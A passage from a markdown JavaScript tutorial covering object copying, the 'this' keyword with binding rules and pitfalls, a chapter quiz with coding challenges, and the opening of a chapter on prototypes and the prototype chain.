const simpleObj = { a: 1, b: 2, c: 3 };
const copy1 = { ...simpleObj }; // âœ“ Safe

// For objects with one level of nesting: manual deep spread
const oneLevel = { 
  x: 1, 
  nested: { y: 2 } 
};
const copy2 = { 
  ...oneLevel, 
  nested: { ...oneLevel.nested } 
}; // âœ“ Safe

// For complex nested objects without special types: JSON method
const complex = {
  a: { b: { c: { d: 1 } } }
};
const copy3 = JSON.parse(JSON.stringify(complex)); // âœ“ Works

// For objects with functions, dates, etc.: use a library
// lodash: _.cloneDeep(obj)
// structuredClone (modern browsers): structuredClone(obj)
```

**Modern Alternative - `structuredClone`:**

```javascript
const original = {
  date: new Date(),
  array: [1, 2, 3],
  nested: {
    deep: {
      value: 'test'
    }
  },
  map: new Map([['key', 'value']]),
  set: new Set([1, 2, 3])
};

// Modern deep clone (Node.js 17+, modern browsers)
const deepCopy = structuredClone(original);

deepCopy.nested.deep.value = 'modified';
deepCopy.array.push(4);

console.log(original.nested.deep.value); // 'test' (unchanged)
console.log(original.array); // [1, 2, 3] (unchanged)
console.log(deepCopy.nested.deep.value); // 'modified'
console.log(deepCopy.array); // [1, 2, 3, 4]
```

---

## 4.6 `this` Keyword

### Why `this` Is Confusing (And Why It Matters)

The `this` keyword is one of JavaScript's most misunderstood features. Unlike most languages where `this` always refers to the current object instance, **JavaScript's `this` is determined at call time, not definition time.**

This matters because:

- **Method borrowing** â€” You can use one object's method on another object
- **Event handlers** â€” `this` inside handlers refers to the element, not your object
- **Callbacks** â€” `this` often gets "lost" when passing methods as callbacks
- **Arrow functions** â€” They inherit `this` from their enclosing scope, changing the rules

Understanding `this` prevents bugs like "Cannot read property of undefined" when `this` isn't what you expect.

### The Core Rule

The `this` keyword in JavaScript refers to the object that is currently executing the code. **Its value depends on how a function is called, not where it's defined.**

| Call Style | `this` Value |
|------------|--------------|
| `obj.method()` | `obj` |
| `func()` | `globalThis` (sloppy) / `undefined` (strict) |
| `new Func()` | The new instance |
| `func.call(obj)` | `obj` |
| `() => {}` | Inherited from enclosing scope |

### Global Context

In the global execution context, `this` refers to the global object.

**In Browser Environment:**

```javascript
console.log(this); // Window object

this.globalVar = 'I am global';
console.log(window.globalVar); // 'I am global'

var anotherVar = 'Also global';
console.log(this.anotherVar); // 'Also global'
```

**In Node.js Environment:**

```javascript
console.log(this); // {} (empty object in module scope)

// In the global scope (outside module)
// this would refer to the global object
```

**Global Functions:**

```javascript
function showThis() {
  console.log(this);
}

showThis(); // Window object (browser) or global object (Node.js)
```

### Function Context

In regular functions, `this` depends on how the function is called, not where it's defined.

**Simple Function Call:**

```javascript
function regularFunction() {
  console.log(this);
}

regularFunction(); // Window (non-strict) or undefined (strict mode)
```

**Function Call Variations:**

```javascript
function greet(greeting) {
  console.log(greeting + ', ' + this.name);
}

// Direct call - this is undefined (strict mode) or global (non-strict)
greet('Hello'); // Error in strict mode or "Hello, undefined" in non-strict

// Assigned to variable
const greetFunc = greet;
greetFunc('Hi'); // Same behavior as direct call
```

### Method Context

When a function is called as a method of an object, `this` refers to that object.

**Basic Method Call:**

```javascript
const person = {
  name: 'Alice',
  age: 30,
  greet: function() {
    console.log(`Hello, I'm ${this.name} and I'm ${this.age} years old.`);
  }
};

person.greet(); // "Hello, I'm Alice and I'm 30 years old."
// this === person
```

**Method with Nested Properties:**

```javascript
const user = {
  firstName: 'John',
  lastName: 'Doe',
  fullName: function() {
    return this.firstName + ' ' + this.lastName;
  },
  getInfo: function() {
    return {
      name: this.fullName(),
      description: `User: ${this.firstName}`
    };
  }
};

console.log(user.fullName()); // 'John Doe'
console.log(user.getInfo()); // { name: 'John Doe', description: 'User: John' }
```

**Losing `this` Context:**

```javascript
const person = {
  name: 'Bob',
  sayName: function() {
    console.log(this.name);
  }
};

person.sayName(); // 'Bob' (this === person)

// Losing context when assigned to variable
const sayNameFunc = person.sayName;
sayNameFunc(); // undefined (this is global/undefined)

// Losing context in callbacks
setTimeout(person.sayName, 1000); // undefined (after 1 second)
```

**Nested Objects:**

```javascript
const company = {
  name: 'Tech Corp',
  department: {
    name: 'Engineering',
    manager: {
      name: 'Alice',
      introduce: function() {
        console.log(`I'm ${this.name}`);
      }
    }
  }
};

company.department.manager.introduce(); // "I'm Alice"
// this refers to the immediate parent (manager object)
```

### Constructor Context

When a function is used as a constructor with the `new` keyword, `this` refers to the newly created object.

**Basic Constructor:**

```javascript
function Person(name, age) {
  this.name = name;
  this.age = age;
  this.greet = function() {
    console.log(`Hello, I'm ${this.name}`);
  };
}

const alice = new Person('Alice', 30);
const bob = new Person('Bob', 25);

alice.greet(); // "Hello, I'm Alice"
bob.greet();   // "Hello, I'm Bob"

console.log(alice.name); // 'Alice'
console.log(bob.name);   // 'Bob'
```

**What `new` Does:**

```javascript
function User(username) {
  // 1. new creates empty object: this = {}
  // 2. Sets prototype: this.__proto__ = User.prototype
  // 3. Executes function body
  this.username = username;
  this.isActive = true;
  // 4. Returns this (implicitly)
}

const user1 = new User('john_doe');
console.log(user1); // User { username: 'john_doe', isActive: true }
```

**Forgetting `new` Keyword:**

```javascript
function Person(name) {
  this.name = name;
}

// Without new - this refers to global object
const wrongPerson = Person('Charlie');
console.log(wrongPerson); // undefined (function doesn't return anything)
console.log(window.name); // 'Charlie' (accidentally created global variable!)

// With new - this refers to new object
const correctPerson = new Person('Diana');
console.log(correctPerson); // Person { name: 'Diana' }
```

**Constructor with Return Value:**

```javascript
function CustomObject(value) {
  this.value = value;
  
  // Returning object overrides the default behavior
  return { customValue: value * 2 };
}

const obj = new CustomObject(5);
console.log(obj); // { customValue: 10 } (returned object is used)

function AnotherObject(value) {
  this.value = value;
  
  // Returning primitive doesn't override
  return 42;
}

const obj2 = new AnotherObject(10);
console.log(obj2); // AnotherObject { value: 10 } (primitive return ignored)
```

### Arrow Functions and `this`

Arrow functions don't have their own `this` binding. They inherit `this` from the enclosing lexical context.

**Basic Arrow Function Behavior:**

```javascript
const obj = {
  name: 'Regular Object',
  regularFunc: function() {
    console.log('Regular:', this.name);
  },
  arrowFunc: () => {
    console.log('Arrow:', this.name);
  }
};

obj.regularFunc(); // 'Regular: Regular Object'
obj.arrowFunc();   // 'Arrow: undefined' (inherits global this)
```

**Arrow Functions in Methods:**

```javascript
const person = {
  name: 'Alice',
  hobbies: ['reading', 'gaming', 'cooking'],
  
  showHobbies: function() {
    this.hobbies.forEach(function(hobby) {
      // Regular function - this is undefined/global
      console.log(this.name + ' likes ' + hobby); // Error or wrong output
    });
  },
  
  showHobbiesArrow: function() {
    this.hobbies.forEach((hobby) => {
      // Arrow function - this inherited from showHobbiesArrow
      console.log(this.name + ' likes ' + hobby); // Works correctly!
    });
  }
};

// person.showHobbies(); // Error or "undefined likes reading"
person.showHobbiesArrow();
// Alice likes reading
// Alice likes gaming
// Alice likes cooking
```

**Common Use Case - Callbacks:**

```javascript
const counter = {
  count: 0,
  
  // Using regular function (problematic)
  startRegular: function() {
    setInterval(function() {
      this.count++; // this is global/undefined, not counter
      console.log(this.count);
    }, 1000);
  },
  
  // Using arrow function (correct)
  startArrow: function() {
    setInterval(() => {
      this.count++; // this is counter object
      console.log(this.count);
    }, 1000);
  },
  
  // Using bind (alternative solution)
  startBind: function() {
    setInterval(function() {
      this.count++;
      console.log(this.count);
    }.bind(this), 1000);
  }
};

counter.startArrow(); // 1, 2, 3, 4... (works correctly)
```

**Arrow Functions and Constructors:**

```javascript
// Arrow functions CANNOT be used as constructors
const Person = (name) => {
  this.name = name;
};

// const p = new Person('Alice'); // TypeError: Person is not a constructor
```

**Nested Arrow Functions:**

```javascript
const obj = {
  name: 'Outer',
  
  method: function() {
    console.log('Method this:', this.name); // 'Outer'
    
    const inner1 = () => {
      console.log('Arrow 1 this:', this.name); // 'Outer' (inherited)
      
      const inner2 = () => {
        console.log('Arrow 2 this:', this.name); // 'Outer' (inherited)
      };
      
      inner2();
    };
    
    inner1();
  }
};

obj.method();
// Method this: Outer
// Arrow 1 this: Outer
// Arrow 2 this: Outer
```

### Explicit Binding (`call`, `apply`, `bind`)

JavaScript provides methods to explicitly set the value of `this` in a function call.

**`call()` Method:**

```javascript
function greet(greeting, punctuation) {
  console.log(greeting + ', ' + this.name + punctuation);
}

const person1 = { name: 'Alice' };
const person2 = { name: 'Bob' };

// call(thisArg, arg1, arg2, ...)
greet.call(person1, 'Hello', '!'); // "Hello, Alice!"
greet.call(person2, 'Hi', '.'); // "Hi, Bob."
```

**`apply()` Method:**

```javascript
function introduce(greeting, age, city) {
  console.log(`${greeting}, I'm ${this.name}, ${age} years old from ${city}`);
}

const person = { name: 'Charlie' };

// apply(thisArg, [argsArray])
introduce.apply(person, ['Hello', 30, 'New York']);
// "Hello, I'm Charlie, 30 years old from New York"
```

**`call()` vs `apply()`:**

```javascript
function sum(a, b, c) {
  return a + b + c + this.base;
}

const obj = { base: 10 };

// call - arguments passed individually
console.log(sum.call(obj, 1, 2, 3)); // 16 (1+2+3+10)

// apply - arguments passed as array
console.log(sum.apply(obj, [1, 2, 3])); // 16 (1+2+3+10)

// Practical use of apply with Math.max
const numbers = [5, 2, 9, 1, 7];
console.log(Math.max.apply(null, numbers)); // 9
```

**`bind()` Method:**

```javascript
function greet(greeting) {
  console.log(greeting + ', ' + this.name);
}

const person = { name: 'Diana' };

// bind returns a NEW function with this permanently set
const greetDiana = greet.bind(person);

greetDiana('Hello'); // "Hello, Diana"
greetDiana('Hi');    // "Hi, Diana"

// Original function unchanged
greet('Hey'); // "Hey, undefined" (this is global)
```

**Partial Application with `bind()`:**

```javascript
function multiply(a, b) {
  return a * b;
}

// Pre-set first argument
const double = multiply.bind(null, 2);
const triple = multiply.bind(null, 3);

console.log(double(5)); // 10 (2 * 5)
console.log(triple(5)); // 15 (3 * 5)
```

**Fixing Lost Context with `bind()`:**

```javascript
const person = {
  name: 'Emma',
  sayName: function() {
    console.log(this.name);
  }
};

// Problem: lost context
setTimeout(person.sayName, 1000); // undefined

// Solution 1: bind
setTimeout(person.sayName.bind(person), 1000); // 'Emma'

// Solution 2: arrow function
setTimeout(() => person.sayName(), 1000); // 'Emma'

// Solution 3: wrapper function
setTimeout(function() { person.sayName(); }, 1000); // 'Emma'
```

**Chaining Bind Calls:**

```javascript
function show() {
  console.log(this.value);
}

const obj1 = { value: 'First' };
const obj2 = { value: 'Second' };

const bound1 = show.bind(obj1);
const bound2 = bound1.bind(obj2); // Trying to rebind

bound1(); // 'First'
bound2(); // 'First' (still uses obj1! Cannot rebind)
```

**Explicit Binding with Arrow Functions:**

```javascript
const arrowFunc = () => {
  console.log(this.value);
};

const obj = { value: 'Test' };

// Arrow functions ignore call/apply/bind
arrowFunc.call(obj);  // undefined (uses lexical this)
arrowFunc.apply(obj); // undefined
const boundArrow = arrowFunc.bind(obj);
boundArrow(); // undefined

// Arrow functions inherit this from where they're defined
const container = {
  value: 'Container',
  getArrow: function() {
    return () => console.log(this.value);
  }
};

const myArrow = container.getArrow();
myArrow(); // 'Container' (inherited from getArrow's this)
myArrow.call({ value: 'Other' }); // Still 'Container' (cannot be changed)
```

### `this` in Event Handlers

In event handlers, `this` typically refers to the element that triggered the event.

**DOM Event Handlers:**

```javascript
// HTML: <button id="myButton">Click Me</button>

const button = document.getElementById('myButton');

// Regular function - this is the button element
button.addEventListener('click', function() {
  console.log(this); // <button id="myButton">
  console.log(this.textContent); // "Click Me"
  this.style.backgroundColor = 'blue';
});
```

**Arrow Functions in Event Handlers:**

```javascript
const button = document.getElementById('myButton');

// Arrow function - this is NOT the button
button.addEventListener('click', () => {
  console.log(this); // Window or whatever this was in outer scope
  // this.style.backgroundColor = 'blue'; // Won't work as expected!
});
```

**Using `this` in Object Methods as Event Handlers:**

```javascript
const app = {
  count: 0,
  buttonElement: document.getElementById('myButton'),
  
  init: function() {
    // Problem: this will be the button, not app
    this.buttonElement.addEventListener('click', this.handleClick);
    
    // Solution 1: bind
    // this.buttonElement.addEventListener('click', this.handleClick.bind(this));
    
    // Solution 2: arrow function
    // this.buttonElement.addEventListener('click', () => this.handleClick());
  },
  
  handleClick: function() {
    this.count++; // If not bound correctly, this.count is undefined
    console.log('Count:', this.count);
  }
};

// Proper implementation
const betterApp = {
  count: 0,
  buttonElement: document.getElementById('myButton'),
  
  init: function() {
    this.buttonElement.addEventListener('click', this.handleClick.bind(this));
  },
  
  handleClick: function(event) {
    this.count++;
    console.log('Count:', this.count);
    console.log('Clicked element:', event.currentTarget); // Access element via event
  }
};

betterApp.init();
```

**Inline Event Handlers:**

```html
<!-- HTML with inline handler -->
<button onclick="handleClick()">Click Me</button>

<script>
// this in inline handlers refers to the element
function handleClick() {
  console.log(this); // Window (function called in global context)
}

// To access element, use:
// <button onclick="handleClick.call(this)">Click Me</button>
// Now this inside handleClick will be the button
</script>
```

**Multiple Event Handlers:**

```javascript
const element = document.getElementById('myElement');

const handler = {
  name: 'Handler Object',
  
  onClick: function(event) {
    console.log('Clicked by:', this.name);
    console.log('Element:', event.currentTarget);
  },
  
  onHover: function(event) {
    console.log('Hovered by:', this.name);
  }
};

// Must bind to preserve this context
element.addEventListener('click', handler.onClick.bind(handler));
element.addEventListener('mouseenter', handler.onHover.bind(handler));
```

### `this` in Strict Mode

Strict mode changes how `this` behaves in certain contexts.

**Global Context in Strict Mode:**

```javascript
'use strict';

console.log(this); // undefined (in function context)

function showThis() {
  console.log(this);
}

showThis(); // undefined (not Window!)
```

**Non-Strict vs Strict Mode:**

```javascript
// Non-strict mode
function nonStrict() {
  console.log(this); // Window or global object
}

nonStrict();

// Strict mode
function strictMode() {
  'use strict';
  console.log(this); // undefined
}

strictMode();
```

**Method Calls (Same in Both Modes):**

```javascript
'use strict';

const obj = {
  method: function() {
    console.log(this);
  }
};

obj.method(); // obj (same as non-strict mode)
```

**Accidental Global Assignment Prevention:**

```javascript
'use strict';

function Person(name) {
  this.name = name; // TypeError if called without 'new'
}

// Person('Alice'); // TypeError: Cannot set property 'name' of undefined

const person = new Person('Alice'); // Works fine
console.log(person.name); // 'Alice'
```

**Strict Mode in Different Scopes:**

```javascript
// Non-strict outer scope
function outer() {
  console.log('Outer this:', this); // Window/global
  
  function inner() {
    'use strict';
    console.log('Inner this:', this); // undefined
  }
  
  inner();
}

outer();
```

### Common Pitfalls and Solutions

Understanding common `this` pitfalls helps avoid bugs and write better code.

**Pitfall 1: Losing Context in Callbacks**

```javascript
// Problem
const user = {
  name: 'Alice',
  tasks: ['task1', 'task2'],
  
  showTasks: function() {
    this.tasks.forEach(function(task) {
      console.log(this.name + ' needs to do: ' + task); // this is undefined!
    });
  }
};

// Solution 1: Arrow function
const user1 = {
  name: 'Alice',
  tasks: ['task1', 'task2'],
  
  showTasks: function() {
    this.tasks.forEach((task) => {
      console.log(this.name + ' needs to do: ' + task); // Works!
    });
  }
};

// Solution 2: Bind
const user2 = {
  name: 'Alice',
  tasks: ['task1', 'task2'],
  
  showTasks: function() {
    this.tasks.forEach(function(task) {
      console.log(this.name + ' needs to do: ' + task);
    }.bind(this)); // Bind this to the callback
  }
};

// Solution 3: Store this in variable
const user3 = {
  name: 'Alice',
  tasks: ['task1', 'task2'],
  
  showTasks: function() {
    const self = this; // Store reference
    this.tasks.forEach(function(task) {
      console.log(self.name + ' needs to do: ' + task); // Use stored reference
    });
  }
};

// Solution 4: forEach thisArg parameter
const user4 = {
  name: 'Alice',
  tasks: ['task1', 'task2'],
  
  showTasks: function() {
    this.tasks.forEach(function(task) {
      console.log(this.name + ' needs to do: ' + task);
    }, this); // Pass this as second argument
  }
};
```

**Pitfall 2: Method Assignment**

```javascript
// Problem
const person = {
  name: 'Bob',
  greet: function() {
    console.log('Hello, ' + this.name);
  }
};

const greet = person.greet;
greet(); // "Hello, undefined" - lost context!

// Solution 1: Call as method
person.greet(); // "Hello, Bob"

// Solution 2: Bind
const boundGreet = person.greet.bind(person);
boundGreet(); // "Hello, Bob"

// Solution 3: Wrapper function
const wrappedGreet = () => person.greet();
wrappedGreet(); // "Hello, Bob"
```

**Pitfall 3: Nested Functions**

```javascript
// Problem
const obj = {
  value: 42,
  
  outerMethod: function() {
    console.log('Outer:', this.value); // 42
    
    function innerFunction() {
      console.log('Inner:', this.value); // undefined - lost context!
    }
    
    innerFunction();
  }
};

obj.outerMethod();

// Solution: Arrow function for inner function
const obj2 = {
  value: 42,
  
  outerMethod: function() {
    console.log('Outer:', this.value); // 42
    
    const innerFunction = () => {
      console.log('Inner:', this.value); // 42 - inherited context!
    };
    
    innerFunction();
  }
};

obj2.outerMethod();
```

**Pitfall 4: setTimeout/setInterval**

```javascript
// Problem
const timer = {
  seconds: 0,
  
  start: function() {
    setInterval(function() {
      this.seconds++; // this is global/undefined!
      console.log(this.seconds);
    }, 1000);
  }
};

// Solution 1: Arrow function
const timer1 = {
  seconds: 0,
  
  start: function() {
    setInterval(() => {
      this.seconds++;
      console.log(this.seconds);
    }, 1000);
  }
};

// Solution 2: Bind
const timer2 = {
  seconds: 0,
  
  start: function() {
    setInterval(function() {
      this.seconds++;
      console.log(this.seconds);
    }.bind(this), 1000);
  }
};

// Solution 3: Store this
const timer3 = {
  seconds: 0,
  
  start: function() {
    const self = this;
    setInterval(function() {
      self.seconds++;
      console.log(self.seconds);
    }, 1000);
  }
};
```

**Pitfall 5: Class Methods as Callbacks**

```javascript
// Problem
class Button {
  constructor(label) {
    this.label = label;
  }
  
  click() {
    console.log('Button clicked:', this.label);
  }
}

const myButton = new Button('Submit');
const element = document.getElementById('btn');

// This won't work correctly
// element.addEventListener('click', myButton.click); // this.label is undefined

// Solution 1: Bind in constructor
class Button1 {
  constructor(label) {
    this.label = label;
    this.click = this.click.bind(this); // Bind in constructor
  }
  
  click() {
    console.log('Button clicked:', this.label);
  }
}

// Solution 2: Arrow function
class Button2 {
  constructor(label) {
    this.label = label;
  }
  
  // Class field with arrow function
  click = () => {
    console.log('Button clicked:', this.label);
  }
}

// Solution 3: Wrapper
const myButton3 = new Button('Submit');
element.addEventListener('click', () => myButton3.click());
```

**Pitfall 6: Destructuring Methods**

```javascript
// Problem
const user = {
  name: 'Charlie',
  getName: function() {
    return this.name;
  }
};

const { getName } = user;
console.log(getName()); // undefined - lost context!

// Solution 1: Don't destructure
console.log(user.getName()); // 'Charlie'

// Solution 2: Bind during destructuring
const { getName: boundGetName } = user;
const finalGetName = boundGetName.bind(user);
console.log(finalGetName()); // 'Charlie'

// Solution 3: Use arrow function wrapper
const user2 = {
  name: 'Charlie',
  getName: function() {
    return this.name;
  }
};

const getNameWrapper = () => user2.getName();
console.log(getNameWrapper()); // 'Charlie'
```

**Best Practices Summary:**

```javascript
// 1. Use arrow functions for callbacks when you need to preserve this
const obj1 = {
  method() {
    setTimeout(() => {
      // this refers to obj1
    }, 1000);
  }
};

// 2. Bind methods in constructor for event handlers
class Component {
  constructor() {
    this.handleClick = this.handleClick.bind(this);
  }
  
  handleClick() {
    // this always refers to the component
  }
}

// 3. Store this in a variable when arrow functions aren't available
const obj2 = {
  method() {
    const self = this;
    someCallback(function() {
      // use self instead of this
    });
  }
};

// 4. Use call/apply/bind when you need explicit control
function greet() {
  console.log(this.name);
}
greet.call({ name: 'Alice' });

// 5. Remember: arrow functions inherit this, regular functions get their own
```

---


## 4.7 Objects Summary

| Concept | Key Points |
|---------|------------|
| **Object Literals** | `{}` syntax; shorthand properties/methods |
| **Property Access** | Dot notation vs bracket notation |
| **Property Descriptors** | `writable`, `enumerable`, `configurable` |
| **Object Methods** | `keys()`, `values()`, `entries()`, `assign()`, `freeze()` |
| **Destructuring** | Extract properties into variables |
| **Spread/Rest** | `...` for copying/merging objects |
| **`this` Keyword** | Context-dependent; binding rules matter |

### Best Practices

1. **Use shorthand syntax** for concise object literals
2. **Prefer `Object.keys/values/entries`** over `for...in`
3. **Use destructuring** for cleaner parameter handling
4. **Spread for shallow copies** â€” not deep cloning
5. **Understand `this` binding** â€” arrow functions inherit, regular functions don't
6. **Use `Object.freeze()`** for true immutability

---

## Mastery Check

### Quiz Questions

**Q1:** What's the output?
```javascript
const obj = { a: 1 };
const copy = obj;
copy.a = 2;
console.log(obj.a);
```

<details>
<summary>Answer</summary>

`2` â€” Objects are assigned by reference. `copy` and `obj` point to the same object.
</details>

**Q2:** What does this return?
```javascript
const obj = { x: 1, y: 2, z: 3 };
const { x, ...rest } = obj;
console.log(rest);
```

<details>
<summary>Answer</summary>

`{ y: 2, z: 3 }` â€” Rest in destructuring collects remaining properties.
</details>

**Q3:** What happens here?
```javascript
const obj = { a: 1 };
Object.freeze(obj);
obj.a = 2;
obj.b = 3;
console.log(obj);
```

<details>
<summary>Answer</summary>

`{ a: 1 }` â€” `freeze()` prevents modifications silently (or throws in strict mode). Neither the change to `a` nor the new property `b` takes effect.
</details>

**Q4:** What's the value of `this`?
```javascript
const obj = {
  name: 'Object',
  regular: function() { return this.name; },
  arrow: () => this.name
};

const { regular, arrow } = obj;
console.log(obj.regular());
console.log(regular());
console.log(obj.arrow());
```

<details>
<summary>Answer</summary>

```javascript
console.log(obj.regular());  // "Object" (called on obj)
console.log(regular());      // undefined (standalone call, this = globalThis)
console.log(obj.arrow());    // undefined (arrow captures outer this, not obj)
```
</details>

### Coding Challenges

**Challenge 1:** Implement `deepClone(obj)` that creates a true deep copy (no shared references).

<details>
<summary>Solution</summary>

```javascript
function deepClone(obj) {
  // Handle primitives and null
  if (obj === null || typeof obj !== 'object') {
    return obj;
  }
  
  // Handle Date
  if (obj instanceof Date) {
    return new Date(obj.getTime());
  }
  
  // Handle Array
  if (Array.isArray(obj)) {
    return obj.map(item => deepClone(item));
  }
  
  // Handle Object
  const cloned = {};
  for (const key of Object.keys(obj)) {
    cloned[key] = deepClone(obj[key]);
  }
  return cloned;
}

// Modern alternative:
const clone = structuredClone(obj);  // Built-in deep clone
```
</details>

**Challenge 2:** Write `pick(obj, keys)` that returns a new object with only specified keys.

<details>
<summary>Solution</summary>

```javascript
function pick(obj, keys) {
  return Object.fromEntries(
    Object.entries(obj).filter(([key]) => keys.includes(key))
  );
}

// Or:
function pick(obj, keys) {
  return keys.reduce((result, key) => {
    if (key in obj) result[key] = obj[key];
    return result;
  }, {});
}

// Usage
const user = { name: 'Alice', age: 30, password: 'secret' };
pick(user, ['name', 'age']);  // { name: 'Alice', age: 30 }
```
</details>

**Challenge 3:** Create `defaults(target, ...sources)` that only sets missing properties (opposite of Object.assign).

<details>
<summary>Solution</summary>

```javascript
function defaults(target, ...sources) {
  for (const source of sources) {
    for (const key of Object.keys(source)) {
      if (!(key in target)) {
        target[key] = source[key];
      }
    }
  }
  return target;
}

// Usage
const config = { port: 8080 };
defaults(config, { port: 3000, host: 'localhost' });
// { port: 8080, host: 'localhost' } â€” port wasn't overwritten
```
</details>

---

**End of Chapter 4: Objects**

With object fundamentals mastered, you're ready to explore prototypes and inheritance.


# 05-Prototype.md

# 5 Prototypes

JavaScript uses prototypal inheritanceâ€”objects inherit directly from other objects. Every object has an internal `[[Prototype]]` link forming a chain used for property lookup. Understanding prototypes is essential for mastering JavaScript's object model.

---

## 5.1 Prototype Chain

### Why Prototypes Matter

JavaScript doesn't have classical inheritance like Java or C++. Instead, it uses **prototypal inheritance** â€” objects inherit directly from other objects. This matters because:

- **Memory efficiency** â€” Methods defined on prototypes are shared, not copied to each instance
- **Dynamic inheritance** â€” You can modify prototypes at runtime and all instances see the changes
- **Flexible object composition** â€” Objects can inherit from any object, not just classes
- **Foundation of classes** â€” ES6 `class` is syntactic sugar over prototypes

Understanding prototypes is essential because even if you use `class` syntax, you're still using prototypes under the hood.

### The Chain Explained

The prototype chain is JavaScript's fundamental mechanism for inheritance. Every object in JavaScript has an internal link to another object called its prototype. This creates a chain of objects that JavaScript traverses when looking for properties.

### `__proto__` vs `prototype`

Understanding the difference between `__proto__` and `prototype` is crucial for mastering JavaScript's inheritance model.

**`prototype` Property:**

The `prototype` property exists only on **constructor functions** (functions intended to be used with `new`). It defines the prototype that will be assigned to instances created by that constructor.

```javascript
// Constructor function
function Person(name) {
  this.name = name;
}

// The prototype property of the constructor
console.log(Person.prototype); // Person {}
console.log(typeof Person.prototype); // 'object'

// Adding methods to the prototype
Person.prototype.sayHello = function() {
  console.log('Hello, I am ' + this.name);
};

// Create an instance
const alice = new Person('Alice');

// alice doesn't have a 'prototype' property
console.log(alice.prototype); // undefined

// But alice can use the method from Person.prototype
alice.sayHello(); // "Hello, I am Alice"
```

**`__proto__` Property:**

The `__proto__` property (officially `[[Prototype]]`) exists on **all objects** and points to the object's prototype. It's the actual link in the prototype chain.

```javascript
function Person(name) {
  this.name = name;
}

Person.prototype.greet = function() {
  console.log('Hi, I am ' + this.name);
};

const bob = new Person('Bob');

// bob's __proto__ points to Person.prototype
console.log(bob.__proto__ === Person.prototype); // true

// Person.prototype's __proto__ points to Object.prototype
console.log(Person.prototype.__proto__ === Object.prototype); // true

// Object.prototype's __proto__ is null (end of chain)
console.log(Object.prototype.__proto__); // null
```

**Visual Representation:**

```javascript
function Animal(name) {
  this.name = name;
}

Animal.prototype.eat = function() {
  console.log(this.name + ' is eating');
};

const dog = new Animal('Dog');

// The relationship:
// dog (instance)
//   .__proto__ â†’ Animal.prototype (object with eat method)
//                  .__proto__ â†’ Object.prototype (base object)
//                                 .__proto__ â†’ null

console.log(dog.__proto__); // Animal.prototype
console.log(dog.__proto__.__proto__); // Object.prototype
console.log(dog.__proto__.__proto__.__proto__); // null
```

**Key Differences:**

```javascript
function MyConstructor() {}

// 1. prototype is a property of constructor functions
console.log(typeof MyConstructor.prototype); // 'object'
console.log(MyConstructor.prototype.constructor === MyConstructor); // true

// 2. __proto__ is a property of instances (all objects)
const instance = new MyConstructor();
console.log(instance.__proto__ === MyConstructor.prototype); // true

// 3. Constructors also have __proto__ (they're objects too!)
console.log(MyConstructor.__proto__ === Function.prototype); // true

// 4. Regular objects don't have a prototype property
const obj = {};
console.log(obj.prototype); // undefined
console.log(obj.__proto__); // Object.prototype
```

**Modern Alternative - `Object.getPrototypeOf()`:**

```javascript
// Instead of using __proto__ (which is legacy), use:
const person = { name: 'Alice' };

// Get prototype
console.log(Object.getPrototypeOf(person)); // Object.prototype
console.log(Object.getPrototypeOf(person) === person.__proto__); // true

// Set prototype
const parent = { greet() { console.log('Hello'); } };
const child = Object.create(parent);

console.log(Object.getPrototypeOf(child) === parent); // true
```

### Prototype Lookup

When you access a property on an object, JavaScript follows a specific lookup process through the prototype chain.

**The Lookup Process:**

```javascript
function Person(name) {
  this.name = name;
}

Person.prototype.species = 'Human';
Person.prototype.greet = function() {
  return 'Hello, I am ' + this.name;
};

const alice = new Person('Alice');

// Step-by-step lookup process:

// 1. Access alice.name
console.log(alice.name); // 'Alice'
// Found on alice itself (own property) - search stops

// 2. Access alice.species
console.log(alice.species); // 'Human'
// Not found on alice â†’ checks alice.__proto__ (Person.prototype) â†’ found!

// 3. Access alice.toString
console.log(alice.toString()); // '[object Object]'
// Not found on alice â†’ Not found on Person.prototype â†’ 
// checks Person.prototype.__proto__ (Object.prototype) â†’ found!

// 4. Access alice.nonExistent
console.log(alice.nonExistent); // undefined
// Not found on alice â†’ Not found on Person.prototype â†’ 
// Not found on Object.prototype â†’ returns undefined
```

**Detailed Lookup Example:**

```javascript
function Animal(name) {
  this.name = name;
  this.energy = 100;
}

Animal.prototype.sleep = function() {
  console.log(this.name + ' is sleeping');
  this.energy = 100;
};

Animal.prototype.eat = function() {
  console.log(this.name + ' is eating');
  this.energy += 10;
};

const cat = new Animal('Cat');

// Lookup for cat.name
// 1. Check cat object itself â†’ FOUND (own property)
console.log('name' in cat); // true
console.log(cat.hasOwnProperty('name')); // true

// Lookup for cat.sleep
// 1. Check cat object itself â†’ NOT FOUND
// 2. Check cat.__proto__ (Animal.prototype) â†’ FOUND
console.log('sleep' in cat); // true
console.log(cat.hasOwnProperty('sleep')); // false

// Lookup for cat.toString
// 1. Check cat object itself â†’ NOT FOUND
// 2. Check Animal.prototype â†’ NOT FOUND
// 3. Check Object.prototype â†’ FOUND
console.log('toString' in cat); // true
console.log(cat.hasOwnProperty('toString')); // false
```

**Performance Considerations:**

```javascript
function Deep() {}
Deep.prototype.level1 = function() {};

function Deeper() {}
Deeper.prototype = Object.create(Deep.prototype);
Deeper.prototype.level2 = function() {};

function Deepest() {}
Deepest.prototype = Object.create(Deeper.prototype);
Deepest.prototype.level3 = function() {};

const obj = new Deepest();

// Accessing level3 is fast (one lookup)
obj.level3(); // Found immediately on Deepest.prototype

// Accessing level1 is slower (three lookups)
obj.level1(); // Checks Deepest.prototype â†’ Deeper.prototype â†’ Deep.prototype â†’ FOUND

// This is why flat hierarchies are generally better for performance
```

**Caching and Optimization:**

```javascript
// JavaScript engines optimize prototype lookups

function Counter() {
  this.count = 0;
}

Counter.prototype.increment = function() {
  this.count++;
};

const c1 = new Counter();

// First call: full prototype lookup
c1.increment(); // JS engine learns the path

// Subsequent calls: optimized (inline cache)
c1.increment(); // Much faster
c1.increment(); // Even faster

// Modern JS engines create "shapes" or "hidden classes" to optimize this
```

### `Object.prototype`

`Object.prototype` is the root of the prototype chain. All objects (except those created with `Object.create(null)`) eventually inherit from `Object.prototype`.

**Common Methods on `Object.prototype`:**

```javascript
// Every object has access to these methods via the prototype chain

const obj = { name: 'Alice' };

// toString() - converts object to string
console.log(obj.toString()); // '[object Object]'

// valueOf() - returns primitive value
console.log(obj.valueOf()); // { name: 'Alice' }

// hasOwnProperty() - checks if property is own (not inherited)
console.log(obj.hasOwnProperty('name')); // true
console.log(obj.hasOwnProperty('toString')); // false

// isPrototypeOf() - checks if object is in another's prototype chain
console.log(Object.prototype.isPrototypeOf(obj)); // true

// propertyIsEnumerable() - checks if property is enumerable
console.log(obj.propertyIsEnumerable('name')); // true

// __proto__ (getter/setter) - accesses prototype
